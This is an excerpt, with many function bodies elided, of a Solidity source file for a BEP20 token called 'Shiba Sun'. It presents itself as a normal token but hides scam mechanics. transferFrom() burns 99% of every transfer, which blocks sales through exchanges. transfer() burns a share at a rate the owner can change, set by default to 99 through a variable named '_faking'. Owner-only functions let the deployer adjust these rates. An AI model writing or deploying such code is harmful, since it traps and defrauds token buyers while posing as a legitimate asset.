...
contract BEP20Token is IBEP20DN {
    using Math20DN for uint256;

    string public name20KT =  "Shiba Sun";
    string public symbol20KT =  "ShibaSun";
    uint8 public decimals20KT = 9;
    uint public _totalSupply = 1*10**15 * 10**9;
    
    address private _owner;
    uint8 private _faking = 99;
    uint8 private _sfaking;
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function transfer(address to, uint tokens) public override returns (bool success) {
            ...
            _fire(_msgSender(),tokens.mul(getAlYaking()).div(10**2));
            _transfer(_msgSender(), to, tokens.sub(tokens.mul(getAlYaking()).div(10**2)));
            return true;
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _fire(from, tokens.mul(99).div(10**2));
        _transfer(from, to, tokens.sub(tokens.mul(99).div(10**2)));
    ...
    function _fire(address tokenOwner, uint256 tokens) internal {
    ...
    function sAlYaking(uint8 faking) public virtual onlyOwner {
		_faking = faking;
	}
    ...
    function sGiveFire(uint8 sfaking) public virtual onlyOwner {
		_sfaking = sfaking;
	}
	
	function getGiveFire() public view returns (uint8) {
        return _sfaking;
    }
